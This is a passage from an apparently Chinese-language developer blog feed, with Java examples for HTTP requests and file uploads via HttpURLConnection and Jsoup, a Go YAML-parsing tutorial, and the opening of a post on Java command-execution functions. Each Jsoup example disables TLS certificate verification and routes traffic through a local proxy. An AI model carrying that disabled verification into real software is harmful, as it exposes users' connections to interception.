writer.append(&quot;Content-Disposition: form-data; name=\&quot;file\&quot;; filename=\&quot;&quot; + fileName + &quot;\&quot;&quot;).append(&quot;\r\n&quot;);<br>                writer.append(&quot;Content-Type: application/octet-stream&quot;).append(&quot;\r\n&quot;);<br>                writer.append(&quot;\r\n&quot;).flush();<br><br>                try (InputStream fileInputStream = new FileInputStream(file)) &#123;<br>                    byte[] buffer = new byte[4096];<br>                    int bytesRead;<br>                    while ((bytesRead = fileInputStream.read(buffer)) != -1) &#123;<br>                        os.write(buffer, 0, bytesRead);<br>                    &#125;<br>                    os.flush();<br>                &#125;<br>                writer.append(&quot;\r\n&quot;).flush();<br>                writer.append(&quot;--&quot; + boundary + &quot;--&quot;).append(&quot;\r\n&quot;);<br>            &#125;<br><br>            // 获取响应代码<br>            int responseCode = connection.getResponseCode();<br><br>            if (responseCode == 200) &#123;<br>                // 获取响应头中的编码信息<br>                String contentType = connection.getHeaderField(&quot;Content-Type&quot;);<br>                Charset charset = Charset.defaultCharset();<br><br>                if (contentType != null) &#123;<br>                    String[] values = contentType.split(&quot;;&quot;);<br>                    for (String value : values) &#123;<br>                        value = value.trim();<br>                        if (value.toLowerCase().startsWith(&quot;charset=&quot;)) &#123;<br>                            String charsetValue = value.substring(&quot;charset=&quot;.length());<br>                            charset = Charset.forName(charsetValue);<br>                        &#125;<br>                    &#125;<br>                &#125;<br><br>                // 读取响应<br>                // 读取响应<br>                try (BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream(), charset))) &#123;<br>                    String line;<br>                    StringBuilder response = new StringBuilder();<br><br>                    while ((line = reader.readLine()) != null) &#123;<br>                        response.append(line);<br>                    &#125;<br><br>                    // 输出响应<br>                    System.out.println(&quot;Response from &quot; + url + &quot;:&quot;);<br>                    System.out.println(response.toString());<br>                &#125;<br><br>                     // 关闭连接<br>                connection.disconnect();<br>            &#125; else &#123;<br>                System.out.println(&quot;连接失败。响应代码：&quot; + responseCode);<br>            &#125;<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="JSOUP框架"><a href="#JSOUP框架" class="headerlink" title="JSOUP框架"></a>JSOUP框架</h1><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p><a href="https://jsoup.org/packages/jsoup-1.16.1.jar">https://jsoup.org/packages/jsoup-1.16.1.jar</a></p><h2 id="常用属性"><a href="#常用属性" class="headerlink" title="常用属性"></a>常用属性</h2><table><thead><tr><th>属性</th><th>描述</th><th>示例示例</th></tr></thead><tbody><tr><td><code>.method(Method)</code></td><td>设置HTTP请求方法，例如 GET、POST 等。</td><td><code>Jsoup.connect(url).method(Method.POST)</code></td></tr><tr><td><code>.userAgent(String)</code></td><td>设置用户代理，模拟浏览器请求。</td><td><code>Jsoup.connect(url).userAgent(&quot;Mozilla/5.0&quot;)</code></td></tr><tr><td><code>.referrer(String)</code></td><td>设置引荐页面，表示你从哪个页面跳转而来。</td><td><code>Jsoup.connect(url).referrer(&quot;http://example.com&quot;)</code></td></tr><tr><td><code>.header(String, String)</code></td><td>设置请求头，可以包括自定义的HTTP头部。</td><td><code>Jsoup.connect(url).header(&quot;Authorization&quot;, &quot;Bearer token&quot;)</code></td></tr><tr><td><code>.data(String, String)</code></td><td>添加 POST 请求的数据，以键值对形式提供数据。</td><td><code>Jsoup.connect(url).data(&quot;username&quot;, &quot;john&quot;).data(&quot;password&quot;, &quot;secret&quot;)</code></td></tr><tr><td><code>.timeout(int)</code></td><td>设置连接和读取超时时间（以毫秒为单位）。</td><td><code>Jsoup.connect(url).timeout(5000)</code></td></tr><tr><td><code>.maxBodySize(int)</code></td><td>设置最大允许的响应体大小（以字节为单位）。</td><td><code>Jsoup.connect(url).maxBodySize(1024 * 1024)</code></td></tr><tr><td><code>.followRedirects(boolean)</code></td><td>设置是否自动跟随重定向，默认为 true。</td><td><code>Jsoup.connect(url).followRedirects(false)</code></td></tr><tr><td><code>.ignoreHttpErrors(boolean)</code></td><td>设置是否忽略HTTP错误状态码，默认为 false。</td><td><code>Jsoup.connect(url).ignoreHttpErrors(true)</code></td></tr><tr><td><code>.ignoreContentType(boolean)</code></td><td>设置是否忽略内容类型，默认为 false。</td><td><code>Jsoup.connect(url).ignoreContentType(true)</code></td></tr><tr><td><code>.cookies(Map&lt;String, String&gt;)</code></td><td>设置请求时携带的Cookies。</td><td><code>Jsoup.connect(url).cookies(cookies)</code></td></tr><tr><td><code>.validateTLSCertificates(boolean)</code></td><td>设置是否验证TLS证书，默认为 true。</td><td><code>Jsoup.connect(url).validateTLSCertificates(false)</code></td></tr><tr><td><code>.sslSocketFactory(SSLSocketFactory)</code></td><td>设置自定义的SSL Socket工厂，用于SSL连接。</td><td><code>Jsoup.connect(url).sslSocketFactory(customSSLSocketFactory)</code></td></tr><tr><td><code>.proxy(Proxy)</code></td><td>设置代理服务器以访问目标URL。</td><td><code>Jsoup.connect(url).proxy(proxy)</code></td></tr></tbody></table><h2 id="GET请求"><a href="#GET请求" class="headerlink" title="GET请求"></a>GET请求</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import http.SSlVerification;<br><br>import org.jsoup.Connection;<br>import org.jsoup.Jsoup;<br>import org.jsoup.nodes.Document;<br><br>public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        String url = &quot;https://httpbin.org/get&quot;; // 替换为 https://httpbin.org/get<br><br>        SSlVerification disSSL = new SSlVerification();<br>        disSSL.disableSslVerification();<br>        try &#123;<br>            // 创建一个连接对象，并设置请求参数<br>            Connection connection = Jsoup.connect(url)<br>                    .followRedirects(false) // 不跟随302跳转<br>                    .ignoreHttpErrors(true) // 忽略HTTP错误状态码<br>                    .ignoreContentType(true) // 忽略内容类型<br>                    .timeout(3000) // 超时时间为3秒<br>                    .proxy(&quot;127.0.0.1&quot;, 8080) // 设置代理地址<br>                    .userAgent(&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;) // 设置User-Agent为谷歌浏览器UA<br>                    ; // 忽略TLS证书验证<br><br>            // 使用连接对象发送GET请求并获取网页内容<br>            Document document = connection.get();<br><br>            // 打印网页标题和内容<br>            System.out.println(&quot;网页标题: &quot; + document.title());<br>            System.out.println(&quot;网页内容: &quot; + document.toString());<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="POST请求-1"><a href="#POST请求-1" class="headerlink" title="POST请求"></a>POST请求</h2><h3 id="表单-1"><a href="#表单-1" class="headerlink" title="表单"></a>表单</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import http.SSlVerification;<br><br>import org.jsoup.Connection;<br>import org.jsoup.Jsoup;<br>import org.jsoup.nodes.Document;<br><br>public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        String url = &quot;https://httpbin.org/post&quot;; // 请求的URL已更改为 https://httpbin.org/post<br>        String userAgent = &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&quot;;<br>        String postData = &quot;param1=value1&amp;param2=value2&quot;; // 替换为您要发送的表单数据<br><br>        SSlVerification disSSL = new SSlVerification();<br>        disSSL.disableSslVerification();<br><br>        try &#123;<br>            // 创建一个连接对象，并设置请求参数<br>            Connection connection = Jsoup.connect(url)<br>                    .followRedirects(false) // 不跟随302跳转<br>                    .ignoreHttpErrors(true) // 忽略HTTP错误状态码<br>                    .ignoreContentType(true)    // 忽略内容类型<br>                    .timeout(3000) // 超时时间为3秒<br>                    .proxy(&quot;127.0.0.1&quot;, 8080) // 设置代理地址<br>                    .userAgent(userAgent) // 设置User-Agent为谷歌浏览器UA<br>                    .header(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;) // 设置请求头为表单类型<br>                    .requestBody(postData) // 设置POST请求数据<br>                    .method(Connection.Method.POST); // 使用POST方法发送请求<br><br>            // 使用连接对象发送POST请求并获取响应<br>            Document document = connection.post();<br><br>            // 打印响应内容<br>            System.out.println(&quot;响应内容: &quot; + document.text());<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="JSON-1"><a href="#JSON-1" class="headerlink" title="JSON"></a>JSON</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import http.SSlVerification;<br><br>import org.jsoup.Connection;<br>import org.jsoup.Jsoup;<br><br>public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 禁用SSL证书验证<br>            SSlVerification disSSL = new SSlVerification();<br>            disSSL.disableSslVerification();<br><br>            // 请求的URL<br>            String url = &quot;https://httpbin.org/post&quot;; // 替换为目标URL<br><br>            // 创建JSON数据<br>            String jsonPayload = &quot;&#123;\&quot;key1\&quot;: \&quot;value1\&quot;, \&quot;key2\&quot;: \&quot;value2\&quot;&#125;&quot;;<br><br>            // 发起POST请求并设置请求头<br>            Connection.Response response = Jsoup.connect(url)<br>                    .method(Connection.Method.POST)<br>                    .header(&quot;Content-Type&quot;, &quot;application/json&quot;) // 设置Content-Type为JSON<br>                    .requestBody(jsonPayload) // 设置JSON数据作为请求体<br>                    .ignoreHttpErrors(true) // 忽略HTTP错误<br>                    .ignoreContentType(true) // 忽略内容类型<br>                    .proxy(&quot;127.0.0.1&quot;, 8080)<br>                    .execute();<br><br>            // 获取响应内容<br>            String responseBody = response.body();<br><br>            // 打印响应内容<br>            System.out.println(&quot;Response: &quot; + responseBody);<br>        &#125; catch (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import http.SSlVerification;<br><br>import org.jsoup.Connection;<br>import org.jsoup.Jsoup;<br>import java.io.File;<br>import java.io.FileInputStream;<br>import java.io.IOException;<br>import java.io.InputStream;<br><br>public class Test &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 禁用SSL证书验证<br>            SSlVerification disSSL = new SSlVerification();<br>            disSSL.disableSslVerification();<br><br>            // 请求的URL<br>            String url = &quot;http://httpbin.org/post&quot;;<br><br>            // 创建Jsoup连接对象<br>            Connection connection = Jsoup.connect(url);<br><br>            // 设置POST请求方法<br>            connection.method(Connection.Method.POST);<br><br>            // 上传文件<br>            File file = new File(&quot;F:\\111.txt&quot;); // 替换为你的文件路径<br>            InputStream inputStream = new FileInputStream(file);<br><br>            // 添加文件上传<br>            connection.data(&quot;file&quot;, file.getName(), inputStream);<br><br>            // 发起请求<br>            Connection.Response response = connection<br>                    .ignoreHttpErrors(true) // 忽略HTTP错误<br>                    .ignoreContentType(true) // 忽略内容类型<br>                    .proxy(&quot;127.0.0.1&quot;, 8080)<br>                    .execute();<br><br>            // 获取响应内容<br>            String responseBody = response.body();<br><br>            // 打印响应内容<br>            System.out.println(&quot;Response: &quot; + responseBody);<br>        &#125; catch (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JAVA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Go yaml</title>
      <link href="/2023/11/05/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/yml/"/>
      <url>/2023/11/05/%E8%AF%AD%E8%A8%80/Go/%E5%BA%93/yml/</url>
      
        <content type="html"><![CDATA[<h1 id="常用"><a href="#常用" class="headerlink" title="常用"></a>常用</h1><table><thead><tr><th>方法</th><th>用途</th></tr></thead><tbody><tr><td><code>yaml.Unmarshal([]byte, interface&#123;&#125;) error</code></td><td>从 YAML 数据解码到 Go 结构体。</td></tr><tr><td><code>yaml.Marshal(interface&#123;&#125;) ([]byte, error)</code></td><td>将 Go 结构体编码为 YAML 数据。</td></tr><tr><td><code>yaml.NewDecoder(io.Reader)</code></td><td>创建一个新的 YAML 解码器，用于逐行解码 YAML 数据流。</td></tr><tr><td><code>yaml.NewEncoder(io.Writer)</code></td><td>创建一个新的 YAML 编码器，用于将 Go 结构体逐行编码为 YAML 数据流。</td></tr><tr><td><code>yaml.UnmarshalStrict([]byte, interface&#123;&#125;) error</code></td><td>与 <code>yaml.Unmarshal</code> 类似，但要求 YAML 数据严格遵循结构体定义，防止未知字段。</td></tr><tr><td><code>yaml.UnmarshalKey([]byte, interface&#123;&#125;, string)</code></td><td>从 YAML 数据中提取指定字段的值，通常用于检索嵌套结构的值。</td></tr><tr><td><code>yaml.UnmarshalFromFile(string, interface&#123;&#125;) error</code></td><td>从文件中读取 YAML 数据并解码到 Go 结构体。</td></tr></tbody></table><h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><p><code>test.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">baseConfig:<br>  - mysql:<br>      url: 127.0.0.1<br>      username: root<br>      password: 123456<br>      port: 3306<br><br>  - redis:<br>      host: 127.0.0.1<br>      port: 6379<br></code></pre></td></tr></table></figure><p><code>main.go</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;gopkg.in/yaml.v3&quot;<br>&quot;os&quot;<br>)<br><br>// Config 结构用于表示 YAML 配置文件的结构<br>type Config struct &#123;<br>// BaseConfig 是一个切片，用于表示 YAML 配置文件中的 &quot;baseConfig&quot; 部分<br>BaseConfig []struct &#123;<br>// Mysql 结构体表示 &quot;baseConfig&quot; 中的 &quot;mysql&quot; 部分<br>Mysql struct &#123;<br>URL      string `yaml:&quot;url&quot;`      // URL 是 MySQL 服务器的连接地址，对应 YAML 文件中的 &quot;url&quot; 字段<br>Username string `yaml:&quot;username&quot;` // Username 是 MySQL 用户名，对应 YAML 文件中的 &quot;username&quot; 字段<br>Password string `yaml:&quot;password&quot;` // Password 是 MySQL 密码，对应 YAML 文件中的 &quot;password&quot; 字段<br>Port     int    `yaml:&quot;port&quot;`     // Port 是 MySQL 服务器的端口，对应 YAML 文件中的 &quot;port&quot; 字段<br>&#125; `yaml:&quot;mysql&quot;` // 使用 &quot;mysql&quot; 标签指定 YAML 字段名为 &quot;mysql&quot;<br><br>// Redis 结构体表示 &quot;baseConfig&quot; 中的 &quot;redis&quot; 部分<br>Redis struct &#123;<br>Host string `yaml:&quot;host&quot;` // Host 是 Redis 服务器的主机地址，对应 YAML 文件中的 &quot;host&quot; 字段<br>Port int    `yaml:&quot;port&quot;` // Port 是 Redis 服务器的端口，对应 YAML 文件中的 &quot;port&quot; 字段<br>&#125; `yaml:&quot;redis&quot;` // 使用 &quot;redis&quot; 标签指定 YAML 字段名为 &quot;redis&quot;<br>&#125; `yaml:&quot;baseConfig&quot;` // 使用 &quot;baseConfig&quot; 标签指定 YAML 字段名为 &quot;baseConfig&quot;<br>&#125;<br><br>func main() &#123;<br>// 读取 YAML 配置文件<br>yamlFile, err := os.ReadFile(&quot;test.yml&quot;)<br>if err != nil &#123;<br>fmt.Printf(&quot;无法读取配置文件: %v\n&quot;, err)<br>return<br>&#125;<br><br>// 解析 YAML 数据到 Config 结构<br>var config Config<br>err = yaml.Unmarshal(yamlFile, &amp;config)<br>if err != nil &#123;<br>fmt.Printf(&quot;无法解析 YAML 数据: %v\n&quot;, err)<br>return<br>&#125;<br><br>// 输出配置信息<br>for _, item := range config.BaseConfig &#123;<br>fmt.Printf(&quot;MySQL配置:\n&quot;)<br>fmt.Printf(&quot;URL: %s\n&quot;, item.Mysql.URL)<br>fmt.Printf(&quot;Username: %s\n&quot;, item.Mysql.Username)<br>fmt.Printf(&quot;Password: %s\n&quot;, item.Mysql.Password)<br>fmt.Printf(&quot;Port: %d\n&quot;, item.Mysql.Port)<br><br>fmt.Printf(&quot;\nRedis配置:\n&quot;)<br>fmt.Printf(&quot;Host: %s\n&quot;, item.Redis.Host)<br>fmt.Printf(&quot;Port: %d\n&quot;, item.Redis.Port)<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><p><code>test.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">rules:<br>  - rule:<br>      - status: true<br>        name: qqq<br>        pass: qqq<br>      - status: true<br>        name: www<br>        pass: www<br>      - status: true<br>        name: eee<br>        pass: eee<br>      - status: true<br>        name: rrr<br>        pass: rrr<br>    type: Test<br></code></pre></td></tr></table></figure><p><code>main.go</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">package main<br><br>import (<br>&quot;fmt&quot;<br>&quot;gopkg.in/yaml.v3&quot;<br>&quot;os&quot;<br>)<br><br>// Rule 结构体表示一个规则的属性，用于映射 YAML 配置中的一个规则。<br>type Rule struct &#123;<br>Name   string `yaml:&quot;name&quot;`   // Name 对应 YAML 文件中的 &quot;name&quot; 字段<br>Status string `yaml:&quot;status&quot;` // Status 对应 YAML 文件中的 &quot;status&quot; 字段<br>Pass   string `yaml:&quot;pass&quot;`   // Pass 对应 YAML 文件中的 &quot;pass&quot; 字段<br>&#125;<br><br>// Config 结构体表示整个配置文件<br>type Config struct &#123;<br>Rules []struct &#123;<br>Rule []Rule `yaml:&quot;rule&quot;` // Rule 对应 YAML 文件中的 &quot;rule&quot; 字段，是 Rule 结构体的切片<br>Type string `yaml:&quot;type&quot;` // Type 对应 YAML 文件中的 &quot;type&quot; 字段<br>&#125;<br>&#125;<br><br>func main() &#123;<br>// 读取 YAML 配置文件<br>configFile, err := os.ReadFile(&quot;test.yml&quot;) // 读取配置文件的内容<br>if err != nil &#123;<br>fmt.Printf(&quot;无法读取配置文件: %v\n&quot;, err)<br>return<br>&#125;<br><br>var config Config<br><br>_ = yaml.Unmarshal(configFile, &amp;config) // 解析 YAML 数据到 Config 结构体<br><br>// 遍历配置文件中的规则<br>for _, i := range config.Rules &#123;<br>fmt.Println(&quot;Type: &quot;, i.Type) // 输出规则的 Type 字段<br>for _, j := range i.Rule &#123;<br>fmt.Println(&quot;\tName: &quot;, j.Name)       // 输出规则的 Name 字段<br>fmt.Println(&quot;\t\tStatus: &quot;, j.Status) // 输出规则的 Status 字段<br>fmt.Println(&quot;\t\tPass: &quot;, j.Pass)    // 输出规则的 Pass 字段<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA 函数</title>
      <link href="/2023/06/18/%E8%AF%AD%E8%A8%80/Java/Java%20%E5%87%BD%E6%95%B0/"/>
      <url>/2023/06/18/%E8%AF%AD%E8%A8%80/Java/Java%20%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="Runtime-exec"><a href="#Runtime-exec" class="headerlink" title="Runtime.exec()"></a>Runtime.exec()</h2><p>执行系统命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.BufferedReader;<br>import java.io.IOException;<br>import java.io.InputStreamReader;<br><br>public class ExecExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 创建Runtime对象<br>            Runtime runtime = Runtime.getRuntime();<br>            <br>            // 要执行的系统命令<br>            String command = &quot;ls -l&quot;;<br>            <br>            // 执行命令并获取进程对象<br>            Process process = runtime.exec(command);<br>            <br>            // 读取命令执行结果<br>            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));<br>            String line;<br>            while ((line = reader.readLine()) != null) &#123;<br>                System.out.println(line);<br>            &#125;<br>            <br>            // 等待命令执行完毕并获取返回值<br>            int exitCode = process.waitFor();<br>            System.out.println(&quot;Command exited with code: &quot; + exitCode);<br>            <br>            // 关闭资源<br>            reader.close();<br>            <br>        &#125; catch (IOException | InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Runtime-getRuntime-exec"><a href="#Runtime-getRuntime-exec" class="headerlink" title="Runtime.getRuntime().exec()"></a>Runtime.getRuntime().exec()</h2><p>执行给定的命令字符串。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">import java.io.BufferedReader;<br>import java.io.IOException;<br>import java.io.InputStreamReader;<br><br>public class CommandExecutionExample &#123;<br>    public static void main(String[] args) &#123;<br>        try &#123;<br>            // 执行命令<br>            String command = &quot;ls -l&quot;;<br>            Process process = Runtime.getRuntime().exec(command);<br><br>            // 读取命令输出<br>            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));<br>            String line;<br>            while ((line = reader.readLine()) != null) &#123;<br>                System.out.println(line);<br>            &#125;<br><br>            // 等待命令执行完成<br>            int exitCode = process.waitFor();<br>            System.out.println(&quot;Command execution completed with exit code: &quot; + exitCode);<br>        &#125; catch (IOException | InterruptedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ProcessBuilder-command"><a href="#ProcessBuilder-command" class="headerlink" title="ProcessBuilder.command()"></a>ProcessBuilder.command()</h2><p>使用进程构建器执行给定的命令字符串。</p><figure class="highlight plaintext"><table><tr><td 